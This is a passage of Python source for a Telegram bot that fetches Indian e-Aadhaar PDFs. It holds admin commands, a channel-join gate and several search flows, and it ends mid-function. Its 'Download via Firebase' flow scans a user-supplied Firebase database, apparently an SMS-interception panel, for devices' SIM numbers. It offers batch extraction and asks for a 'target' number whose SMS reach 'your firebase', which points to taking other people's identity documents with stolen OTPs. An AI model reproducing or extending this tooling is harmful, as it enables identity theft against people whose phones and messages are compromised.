        f"{DIVIDER}\n"
        f"<i>🛠  sᴇʟᴇᴄᴛ ᴀɴ ᴀᴄᴛɪᴏɴ ʙᴇʟᴏᴡ:</i>",
        reply_markup=get_admin_keyboard()
    )

def handle_admin_command(chat_id, text):
    parts = text.strip().split(None, 2)
    if parts[0] == '/admin':
        show_admin_panel(chat_id)
        return True

    if parts[0] in ('/channel', '/channels'):
        show_admin_channel_menu(chat_id)
        return True

    if parts[0] == '/setchannel' and len(parts) >= 3:
        new_ch_id = parts[1].strip()
        new_ch_link = parts[2].strip()
        ok = database.set_channel_config(new_ch_id, new_ch_link)
        if ok:
            with _cm_lock:
                _channel_member_cache.clear()
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"✅ <b>ᴄʜᴀɴɴᴇʟ sᴜᴄᴄᴇssғᴜʟʟʏ ᴜᴘᴅᴀᴛᴇᴅ!</b>\n\n"
                f"🆔  <b>ᴄʜᴀɴɴᴇʟ ɪᴅ:</b> <code>{new_ch_id}</code>\n"
                f"🔗  <b>ɪɴᴠɪᴛᴇ ʟɪɴᴋ:</b> {new_ch_link}"
            )
            show_admin_channel_menu(chat_id)
        else:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Error saving channel configuration.")
        return True

    if parts[0] == '/stats':
        data = all_users()
        total = len(data)
        banned_count  = sum(1 for u in data.values() if u.get('banned'))
        channel_joins = database.get_channel_verified_count()
        invite_link   = get_channel_invite_url()
        dl_stats      = database.get_download_stats()
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📊 sᴛᴀᴛɪsᴛɪᴄs</b>\n\n"
            f"👥  ᴛᴏᴛᴀʟ ᴜsᴇʀs      —  <b>{total}</b>\n"
            f"📢  ᴄʜᴀɴɴᴇʟ ᴊᴏɪɴs    —  <b>{channel_joins}</b>\n"
            f"🚫  ʙᴀɴɴᴇᴅ           —  <b>{banned_count}</b>\n"
            f"📥  ᴛᴏᴛᴀʟ ᴅᴏᴡɴʟᴏᴀᴅs  —  <b>{dl_stats['total']} PDFs</b>\n\n"
            f"🔗  <b>ʙᴏᴛ ɪɴᴠɪᴛᴇ ʟɪɴᴋ:</b>\n<code>{invite_link}</code>\n"
            f"{DIVIDER}"
        )
        return True

    if parts[0] == '/ban' and len(parts) >= 2:
        try:
            uid = int(parts[1])
            ban_user(uid)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n🚫 ᴜsᴇʀ <code>{uid}</code> ʙᴀɴɴᴇᴅ.")
        except ValueError:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Usage: /ban USERID")
        return True

    if parts[0] == '/unban' and len(parts) >= 2:
        try:
            uid = int(parts[1])
            unban_user(uid)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ ᴜsᴇʀ <code>{uid}</code> ᴜɴʙᴀɴɴᴇᴅ.")
        except ValueError:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Usage: /unban USERID")
        return True

    if parts[0] == '/userinfo' and len(parts) >= 2:
        try:
            uid = int(parts[1])
            u   = get_user(uid)
            if not u:
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ User <code>{uid}</code> not found.")
            else:
                banned_str = "🚫 Yes" if u.get('banned') else "✅ No"
                fn = (u.get('first_name') or '').strip()
                ln = (u.get('last_name') or '').strip()
                full_name = f"{fn} {ln}".strip() or "N/A"
                username = u.get('username')
                uname_str = f"@{username}" if username else "N/A"
                dl_cnt = u.get('downloads_count', 0)
                send_message(
                    chat_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"🆔  <b>ɪᴅ</b>         —  <code>{uid}</code>\n"
                    f"👤  <b>ɴᴀᴍᴇ</b>       —  <b>{html.escape(full_name)}</b>\n"
                    f"🔗  <b>ᴜsᴇʀɴᴀᴍᴇ</b>   —  <b>{html.escape(uname_str)}</b>\n"
                    f"📥  <b>ᴅᴏᴡɴʟᴏᴀᴅs</b>  —  <b>{dl_cnt} PDFs</b>\n"
                    f"🚫  <b>ʙᴀɴɴᴇᴅ</b>     —  {banned_str}\n\n"
                    f"{DIVIDER}"
                )
        except ValueError:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Usage: /userinfo USERID")
        return True

    if parts[0] == '/broadcast' and len(parts) >= 2:
        msg_text = text.strip()[len('/broadcast'):].strip()
        data = all_users()
        sent = 0
        failed = 0
        broadcast_msg = f"<b>📢 ʙʀᴏᴀᴅᴄᴀsᴛ ғʀᴏᴍ {BOT_NAME}</b>\n{DIVIDER}\n\n{msg_text}\n\n{DIVIDER}"
        for uid_str in data:
            try:
                uid_int = int(uid_str)
                if not data[uid_str].get('banned'):
                    res = send_message(uid_int, broadcast_msg)
                    if res and res.get('ok'):
                        sent += 1
                    else:
                        failed += 1
            except Exception:
                failed += 1
            time.sleep(0.05)
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n📢 ʙʀᴏᴀᴅᴄᴀsᴛ ᴅᴏɴᴇ: {sent} Sent, {failed} Failed.")
        return True

    return False

# ============== CALLBACK HANDLER ==============
def handle_callback(chat_id, callback_query_id, data, message_id=None, user_info=None):
    answer_callback_query(callback_query_id)
    touch_session(chat_id)
    if user_info:
        ensure_user(
            chat_id,
            first_name=user_info.get('first_name'),
            last_name=user_info.get('last_name'),
            username=user_info.get('username')
        )

    if data == 'admin_toggle_force_check' and is_admin(chat_id):
        cfg = database.get_channel_config()
        new_fc = not cfg.get("force_check", True)
        database.set_channel_config(cfg.get("channel_id"), cfg.get("channel_link"), force_check=new_fc)
        with _cm_lock:
            _channel_member_cache.clear()
        show_admin_panel(chat_id)
        return

    if data == 'admin_channel_menu' and is_admin(chat_id):
        show_admin_channel_menu(chat_id)
        return

    if data == 'admin_change_channel_prompt' and is_admin(chat_id):
        set_session(chat_id, 'admin_awaiting_channel')
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"✏️ <b>ɴᴇᴡ ᴄʜᴀɴɴᴇʟ ɪᴅ ᴀᴜʀ ɪɴᴠɪᴛᴇ ʟɪɴᴋ ʙʜᴇᴊᴏ:</b>\n\n"
            f"📋 <b>ғᴏʀᴍᴀᴛ:</b>\n<code>CHANNEL_ID INVITE_LINK</code>\n\n"
            f"<i>ᴇxᴀᴍᴘʟᴇ:</i>\n<code>-1002894475319 https://t.me/+Vq7Ha3AVq4JjNTNl</code>",
            reply_markup=get_cancel_keyboard()
        )
        return

    if data == 'admin_back' and is_admin(chat_id):
        show_admin_panel(chat_id)
        return

    if data in ('start', 'main_menu'):
        clear_session(chat_id)
        remove_reply_keyboard(chat_id)
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n\n"
            f"<b>🇮🇳 ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ — sᴛʀᴀɪɢʜᴛ ᴛᴏ ᴛᴇʟᴇɢʀᴀᴍ</b>\n\n"
            f"⚡  sᴏᴜʀᴄᴇ    ·  ᴏғғɪᴄɪᴀʟ ᴜɪᴅᴀɪ ᴘᴏʀᴛᴀʟ\n"
            f"🔓  ᴅᴇʟɪᴠᴇʀʏ  ·  ᴀᴜᴛᴏ-ᴜɴʟᴏᴄᴋᴇᴅ, ɴᴏ ᴘᴀssᴡᴏʀᴅ\n"
            f"⚡  ᴍᴇᴛʜᴏᴅs   ·  ᴍᴏʙɪʟᴇ  ·  ᴀᴀᴅʜᴀᴀʀ  ·  ᴇɪᴅ  ·  ғɪʀᴇʙᴀsᴇ\n\n"
            f"{DIVIDER}\n"
            f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ᴛᴏ ʙᴇɢɪɴ.</i>",
            reply_markup=get_welcome_inline_keyboard()
        )
        return

    if data == 'admin_stats' and is_admin(chat_id):
        data_all      = all_users()
        total         = len(data_all)
        banned_count  = sum(1 for u in data_all.values() if u.get('banned'))
        channel_joins = database.get_channel_verified_count()
        invite_link   = get_channel_invite_url()
        dl_stats      = database.get_download_stats()

        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📊 sᴛᴀᴛɪsᴛɪᴄs</b>\n\n"
            f"👥  ᴛᴏᴛᴀʟ ᴜsᴇʀs      —  <b>{total}</b>\n"
            f"📢  ᴄʜᴀɴɴᴇʟ ᴊᴏɪɴs    —  <b>{channel_joins}</b>\n"
            f"🚫  ʙᴀɴɴᴇᴅ           —  <b>{banned_count}</b>\n\n"
            f"📥  <b>ᴀᴀᴅʜᴀᴀʀ ᴅᴏᴡɴʟᴏᴀᴅs:</b>\n"
            f"  👑  <b>ᴏᴡɴᴇʀ:</b> <b>{dl_stats['owner']} PDFs</b>\n"
            f"  🛡️  <b>ᴀᴅᴍɪɴs:</b> <b>{dl_stats['admin']} PDFs</b>\n"
            f"  👤  <b>ᴜsᴇʀs:</b> <b>{dl_stats['user']} PDFs</b>\n"
            f"  📊  <b>ᴛᴏᴛᴀʟ:</b> <b>{dl_stats['total']} PDFs</b>\n\n"
            f"🔗  <b>ʙᴏᴛ ɪɴᴠɪᴛᴇ ʟɪɴᴋ:</b>\n<code>{invite_link}</code>\n"
            f"{DIVIDER}"
        )
        return

    if data == 'admin_users' and is_admin(chat_id):
        data_all = all_users()
        lines = [f"<b>👥 ᴜsᴇʀs ʟɪsᴛ ({len(data_all)})</b>\n{DIVIDER}"]
        for uid, u in list(data_all.items())[:35]:
            b = " 🚫" if u.get('banned') else ""
            fn = (u.get('first_name') or '').strip()
            ln = (u.get('last_name') or '').strip()
            full_name = f"{fn} {ln}".strip() or "No Name"
            username = u.get('username')
            uname_str = f"@{username}" if username else "No User"
            dl_cnt = u.get('downloads_count', 0)
            lines.append(f"• <code>{uid}</code> | <b>{html.escape(full_name)}</b> ({html.escape(uname_str)}) — <b>{dl_cnt} DL</b>{b}")
        if len(data_all) > 35:
            lines.append(f"\n<i>…and {len(data_all) - 35} more users</i>")
        send_message(chat_id, "\n".join(lines))
        return

    if data == 'admin_userinfo_prompt' and is_admin(chat_id):
        set_session(chat_id, 'admin_awaiting_userinfo')
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n🔍 Enter User ID to lookup:", reply_markup=get_cancel_keyboard())
        return

    if data == 'admin_ban_prompt' and is_admin(chat_id):
        set_session(chat_id, 'admin_awaiting_ban')
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n🚫 Enter User ID to ban:", reply_markup=get_cancel_keyboard())
        return

    if data == 'admin_unban_prompt' and is_admin(chat_id):
        set_session(chat_id, 'admin_awaiting_unban')
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Enter User ID to unban:", reply_markup=get_cancel_keyboard())
        return

    if data == 'admin_broadcast_prompt' and is_admin(chat_id):
        set_session(chat_id, 'admin_awaiting_broadcast')
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n📢 Send the broadcast message:", reply_markup=get_cancel_keyboard())
        return

    if data == 'check_join':
        with _cm_lock:
            _channel_member_cache.pop(str(chat_id), None)
        if not is_force_check_enabled() or is_channel_member(chat_id):
            database.mark_channel_verified(chat_id)
            if user_info:
                ensure_user(
                    chat_id,
                    first_name=user_info.get('first_name'),
                    last_name=user_info.get('last_name'),
                    username=user_info.get('username')
                )
            else:
                ensure_user(chat_id)
            remove_reply_keyboard(chat_id)
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n\n"
                f"<b>🇮🇳 ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ — sᴛʀᴀɪɢʜᴛ ᴛᴏ ᴛᴇʟᴇɢʀᴀᴍ</b>\n\n"
                f"⚡  sᴏᴜʀᴄᴇ    ·  ᴏғғɪᴄɪᴀʟ ᴜɪᴅᴀɪ ᴘᴏʀᴛᴀʟ\n"
                f"🔓  ᴅᴇʟɪᴠᴇʀʏ  ·  ᴀᴜᴛᴏ-ᴜɴʟᴏᴄᴋᴇᴅ, ɴᴏ ᴘᴀssᴡᴏʀᴅ\n"
                f"⚡  ᴍᴇᴛʜᴏᴅs   ·  ᴍᴏʙɪʟᴇ  ·  ᴀᴀᴅʜᴀᴀʀ  ·  ᴇɪᴅ  ·  ғɪʀᴇʙᴀsᴇ\n\n"
                f"{DIVIDER}\n"
                f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ᴛᴏ ʙᴇɢɪɴ.</i>",
                reply_markup=get_welcome_inline_keyboard()
            )
        else:
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>❌ ɴᴏᴛ ᴊᴏɪɴᴇᴅ ʏᴇᴛ</b>\n\n"
                f"⚠️  ᴄʜᴀɴɴᴇʟ ᴍᴇᴍʙᴇʀsʜɪᴘ ɴᴏᴛ ᴅᴇᴛᴇᴄᴛᴇᴅ.\n\n"
                f"<i>👇  ᴊᴏɪɴ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ, ᴛʜᴇɴ ᴛᴀᴘ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴀɢᴀɪɴ.</i>",
                reply_markup=get_join_keyboard()
            )
        return

    if data == 'cancel':
        if message_id:
            delete_message(chat_id, message_id)
        clear_session(chat_id)
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<i>❌  sᴇssɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ.</i>\n\n"
            f"<i>📲  sᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ:</i>",
            reply_markup=get_welcome_inline_keyboard()
        )
        return

    # ── Search flows gates ───────────────────────────────
    if data in ('search_mobile', 'search_aadhaar', 'search_eid', 'search_firebase'):
        if not channel_gate(chat_id):
            return

    if data == 'search_mobile':
        set_session(chat_id, 'awaiting_mobile', {'mode': 'mobile'})
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📱 ᴍᴏʙɪʟᴇ sᴇᴀʀᴄʜ</b>\n\n"
            f"▸  ᴇɴᴛᴇʀ ʏᴏᴜʀ 10-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ\n\n"
            f"<i>📲  ᴏᴛᴘ ᴡɪʟʟ ʙᴇ sᴇɴᴛ ᴛᴏ ᴛʜɪs ɴᴜᴍʙᴇʀ</i>",
            reply_markup=get_cancel_keyboard()
        )
    elif data == 'search_aadhaar':
        set_session(chat_id, 'awaiting_aadhaar', {'mode': 'aadhaar'})
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🪪 ᴀᴀᴅʜᴀᴀʀ sᴇᴀʀᴄʜ</b>\n\n"
            f"▸  ᴇɴᴛᴇʀ ʏᴏᴜʀ 12-ᴅɪɢɪᴛ ᴀᴀᴅʜᴀᴀʀ ɴᴜᴍʙᴇʀ\n\n"
            f"<i>🔢  sᴘᴀᴄᴇs ᴀʀᴇ ʀᴇᴍᴏᴠᴇᴅ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ</i>",
            reply_markup=get_cancel_keyboard()
        )
    elif data == 'search_eid':
        set_session(chat_id, 'awaiting_eid_input', {'mode': 'eid'})
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🔢 ᴇɪᴅ sᴇᴀʀᴄʜ</b>\n\n"
            f"▸  ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴇɴʀᴏʟʟᴍᴇɴᴛ ɪᴅ (ᴇɪᴅ)\n\n"
            f"<i>📋  ғᴏʀᴍᴀᴛ: 1234/56789/12345</i>",
            reply_markup=get_cancel_keyboard()
        )
    elif data == 'search_firebase':
        set_session(chat_id, 'awaiting_fb_url', {'mode': 'firebase'})
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🥷 ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴀ ғɪʀᴇʙᴀsᴇ</b>\n\n"
            f"🌐  <b>ғɪʀᴇʙᴀsᴇ ʀᴛᴅʙ ᴜʀʟ ʙʜᴇᴊᴏ:</b>\n\n"
            f"📋  <i>ᴇxᴀᴍᴘʟᴇs:</i>\n"
            f"• <code>https://my-panel-default-rtdb.firebaseio.com</code>\n"
            f"• <code>https://my-project.firebaseio.com/messages.json</code>\n\n"
            f"💡  <i>ᴀᴀᴘ ᴜʀʟ ᴀᴜʀ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ ᴇᴋ sᴀᴀᴛʜ ʙʜɪ ʙʜᴇᴊ sᴀᴋᴛᴇ ʜᴀɪɴ:</i>\n"
            f"<code>https://my-db.firebaseio.com 9876543210</code>",
            reply_markup=get_cancel_keyboard()
        )
    elif data == 'help':
        show_help(chat_id)
    elif data.startswith('fb_dev_'):
        try:
            idx = int(data.split('_')[2])
            sess = get_session(chat_id)
            d = sess.get('data', {})
            devices = d.get('devices', [])
            fb_url = d.get('fb_url', '')
            if idx >= len(devices) or not fb_url:
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n⚠️ Device not found. Please re-scan.", reply_markup=get_welcome_inline_keyboard())
                return
            dev = devices[idx]
            mob = dev.get('mobile')
            if not mob:
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n⚠️ Selected device has no SIM mobile number. Please choose another device or enter manually.", reply_markup=get_cancel_keyboard())
                return
            update_session_data(chat_id, 'fb_mobile', mob)
            update_session_data(chat_id, 'dev_id', dev.get('dev_id'))
            set_session(chat_id, 'downloading', get_session(chat_id)['data'])
            worker_pool.submit(_handle_firebase_download_worker, chat_id, mob, fb_url, dev.get('dev_id'))
        except Exception as e:
            logger.error(f"Error handling fb_dev callback: {e}", exc_info=True)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Error selecting device: {e}", reply_markup=get_welcome_inline_keyboard())
        return
    elif data.startswith('fb_batch_'):
        try:
            count_str = data.split('_')[2]
            sess = get_session(chat_id)
            d = sess.get('data', {})
            devices = d.get('devices', [])
            fb_url = d.get('fb_url', '')
            valid_devs = [x for x in devices if x.get('mobile')]
            if not valid_devs or not fb_url:
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n⚠️ No valid devices with mobile found to extract.", reply_markup=get_welcome_inline_keyboard())
                return

            req_count = len(valid_devs) if count_str == 'all' else min(int(count_str), len(valid_devs))
            selected_devices = valid_devs[:req_count]
            set_session(chat_id, 'downloading', get_session(chat_id)['data'])
            worker_pool.submit(_handle_firebase_batch_worker, chat_id, fb_url, selected_devices)
        except Exception as e:
            logger.error(f"Error handling fb_batch callback: {e}", exc_info=True)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Error starting batch: {e}", reply_markup=get_welcome_inline_keyboard())
        return
    elif data.startswith('fb_page_'):
        try:
            p = int(data.split('_')[2])
            show_firebase_devices_menu(chat_id, page=p)
        except Exception:
            pass
        return
    elif data == 'fb_manual':
        set_session(chat_id, 'awaiting_fb_mobile', get_session(chat_id)['data'])
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>✏️ ᴇɴᴛᴇʀ ᴄᴜsᴛᴏᴍ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ</b>\n\n"
            f"▸ ᴇɴᴛᴇʀ ᴛᴀʀɢᴇᴛ 10-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ:\n\n"
            f"<i>💡 ʏᴇʜ ɴᴜᴍʙᴇʀ ᴀᴀᴅʜᴀᴀʀ sᴇ ʟɪɴᴋ ʜᴏɴᴀ ᴄʜᴀʜɪʏᴇ ᴀᴜʀ ɪsᴋᴀ sᴍs ᴀᴀᴘᴋᴇ ғɪʀᴇʙᴀsᴇ ᴘᴀʀ ᴀᴀɴᴀ ᴄʜᴀʜɪʏᴇ.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return
    elif data == 'noop':
        return

# ============== MESSAGE HANDLER ==============
_KB_ACTIONS = {
    'mobile number':         'search_mobile',
    'aadhaar number':        'search_aadhaar',
    'eid':                   'search_eid',
    'download via firebase': 'search_firebase',
    'firebase':              'search_firebase',
    'help':                  'help',
}

def handle_message(chat_id, message_text, message_id=None, user_info=None):
    logger.info(f"Msg [{chat_id}]: {message_text[:60]}")
    user_info = user_info or {}
    ensure_user(
        chat_id,
        first_name=user_info.get('first_name'),
        last_name=user_info.get('last_name'),
        username=user_info.get('username')
    )

    if ban_gate(chat_id):
        return

    if is_admin(chat_id) and message_text.startswith('/'):
        if handle_admin_command(chat_id, message_text):
            return

    if message_text.strip().lower() in ('/help', 'help', '/guide', 'guide'):
        show_help(chat_id)
        return

    clean_text = from_sc(message_text.strip().lower())
    clean_text = emoji.replace_emoji(clean_text, replace='').strip()
    clean_text = re.sub(r'[^\w\s]', '', clean_text).strip()
    clean_text = ' '.join(clean_text.split())

    if clean_text in ('cancel', 'back'):
        clear_session(chat_id)
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>❌  sᴇssɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ.</i>", reply_markup=get_welcome_inline_keyboard())
        return

    action = _KB_ACTIONS.get(clean_text)
    if action:
        if action in ('search_mobile', 'search_aadhaar', 'search_eid', 'search_firebase'):
            if not channel_gate(chat_id):
                return
            clear_session(chat_id)
            if action == 'search_mobile':
                set_session(chat_id, 'awaiting_mobile', {'mode': 'mobile'})
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 ᴍᴏʙɪʟᴇ sᴇᴀʀᴄʜ</b>\n\n▸ ᴇɴᴛᴇʀ ʏᴏᴜʀ 10-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ", reply_markup=get_cancel_keyboard())
            elif action == 'search_aadhaar':
                set_session(chat_id, 'awaiting_aadhaar', {'mode': 'aadhaar'})
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🪪 ᴀᴀᴅʜᴀᴀʀ sᴇᴀʀᴄʜ</b>\n\n▸ ᴇɴᴛᴇʀ ʏᴏᴜʀ 12-ᴅɪɢɪᴛ ᴀᴀᴅʜᴀᴀʀ ɴᴜᴍʙᴇʀ", reply_markup=get_cancel_keyboard())
            elif action == 'search_eid':
                set_session(chat_id, 'awaiting_eid_input', {'mode': 'eid'})
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔢 ᴇɪᴅ sᴇᴀʀᴄʜ</b>\n\n▸ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴇɴʀᴏʟʟᴍᴇɴᴛ ɪᴅ (ᴇɪᴅ)", reply_markup=get_cancel_keyboard())
            elif action == 'search_firebase':
                set_session(chat_id, 'awaiting_fb_url', {'mode': 'firebase'})
                send_message(
                    chat_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"<b>🥷 ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴀ ғɪʀᴇʙᴀsᴇ</b>\n\n"
                    f"🌐  <b>ғɪʀᴇʙᴀsᴇ ʀᴛᴅʙ ᴜʀʟ ʙʜᴇᴊᴏ:</b>\n\n"
                    f"📋  <i>ᴇxᴀᴍᴘʟᴇs:</i>\n"
                    f"• <code>https://my-panel-default-rtdb.firebaseio.com</code>\n"
                    f"• <code>https://my-project.firebaseio.com/messages.json</code>\n\n"
                    f"💡  <i>ᴀᴀᴘ ᴜʀʟ ᴀᴜʀ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ ᴇᴋ sᴀᴀᴛʜ ʙʜɪ ʙʜᴇᴊ sᴀᴋᴛᴇ ʜᴀɪɴ:</i>\n"
                    f"<code>https://my-db.firebaseio.com 9876543210</code>",
                    reply_markup=get_cancel_keyboard()
                )
        elif action == 'help':
            show_help(chat_id)
        return

    s = get_session(chat_id)
    current_step = s.get('step', 'main')

    if current_step != 'main':
        idle = time.time() - s.get('last_activity', time.time())
        if idle > SESSION_TIMEOUT:
            clear_session(chat_id)
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>⏰ sᴇssɪᴏɴ ᴇxᴘɪʀᴇᴅ</b>\n\n"
                f"⚠️  ʀᴇᴀsᴏɴ   ·  ɪᴅʟᴇ ғᴏʀ 60 sᴇᴄᴏɴᴅs\n\n"
                f"{DIVIDER}\n"
                f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ.</i>",
                reply_markup=get_menu_keyboard()
            )
            return

    touch_session(chat_id)

    # ── ADMIN INTERACTIVE COMMANDS ───────────────────────
    if current_step == 'admin_awaiting_userinfo' and is_admin(chat_id):
        clear_session(chat_id)
        handle_admin_command(chat_id, f"/userinfo {message_text.strip()}")
        return

    if current_step == 'admin_awaiting_ban' and is_admin(chat_id):
        clear_session(chat_id)
        handle_admin_command(chat_id, f"/ban {message_text.strip()}")
        return

    if current_step == 'admin_awaiting_unban' and is_admin(chat_id):
        clear_session(chat_id)
        handle_admin_command(chat_id, f"/unban {message_text.strip()}")
        return

    if current_step == 'admin_awaiting_broadcast' and is_admin(chat_id):
        clear_session(chat_id)
        handle_admin_command(chat_id, f"/broadcast {message_text.strip()}")
        return

    if current_step == 'admin_awaiting_channel' and is_admin(chat_id):
        parts = message_text.strip().split()
        if len(parts) >= 2:
            new_ch_id = parts[0].strip()
            new_ch_link = parts[1].strip()
            ok = database.set_channel_config(new_ch_id, new_ch_link)
            clear_session(chat_id)
            with _cm_lock:
                _channel_member_cache.clear()
            if ok:
                send_message(
                    chat_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"✅ <b>ᴄʜᴀɴɴᴇʟ sᴜᴄᴄᴇssғᴜʟʟʏ ᴜᴘᴅᴀᴛᴇᴅ!</b>\n\n"
                    f"🆔  <b>ᴄʜᴀɴɴᴇʟ ɪᴅ:</b> <code>{new_ch_id}</code>\n"
                    f"🔗  <b>ɪɴᴠɪᴛᴇ ʟɪɴᴋ:</b> {new_ch_link}"
                )
                show_admin_channel_menu(chat_id)
            else:
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Error saving channel configuration.", reply_markup=get_cancel_keyboard())
        else:
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"❌ <b>ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀᴛ.</b>\n\n"
                f"📋 <b>ғᴏʀᴍᴀᴛ:</b> <code>CHANNEL_ID INVITE_LINK</code>\n"
                f"<i>ᴇxᴀᴍᴘʟᴇ:</i> <code>-1002894475319 https://t.me/+Vq7Ha3AVq4JjNTNl</code>",
                reply_markup=get_cancel_keyboard()
            )
        return

    # ── FIREBASE AUTO-DOWNLOAD FLOW (URL FIRST) ─────────
    if current_step == 'awaiting_fb_url':
        text_clean = message_text.strip()
        parts = text_clean.split()

        found_url = None
        found_mobile = None
        for part in parts:
            p_strip = part.strip()
            if 'firebaseio.com' in p_strip.lower() or p_strip.lower().startswith(('http://', 'https://')):
                found_url = p_strip
            else:
                digits = re.sub(r'\D', '', p_strip)
                if len(digits) == 12 and digits.startswith('91'):
                    digits = digits[2:]
                if len(digits) == 10 and digits.isdigit():
                    found_mobile = digits

        if not found_url:
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"❌  <b>ɪɴᴠᴀʟɪᴅ ғɪʀᴇʙᴀsᴇ ᴜʀʟ.</b>\n\n"
                f"▸  ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ғɪʀᴇʙᴀsᴇ ʀᴇᴀʟᴛɪᴍᴇ ᴅᴀᴛᴀʙᴀsᴇ ᴜʀʟ.\n"
                f"▸  ᴇxᴀᴍᴘʟᴇ: <code>https://my-panel-default-rtdb.firebaseio.com</code>",
                reply_markup=get_cancel_keyboard()
            )
            return

        temp_msg = send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🔍 ᴄᴏɴɴᴇᴄᴛɪɴɢ &amp; sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ…</b>\n\n"
            f"🌐  <code>{found_url}</code>\n"
            f"<i>⏳  ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ᴀ ᴍᴏᴍᴇɴᴛ…</i>"
        )
        temp_id = (temp_msg.get('result') or {}).get('message_id') if temp_msg else None

        ok_conn, conn_msg = bot.test_firebase_connection(found_url)
        if not ok_conn:
            if temp_id:
                delete_message(chat_id, temp_id)
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"❌  <b>ғɪʀᴇʙᴀsᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ғᴀɪʟᴇᴅ</b>\n\n"
                f"⚠️  {html.escape(str(conn_msg))}\n\n"
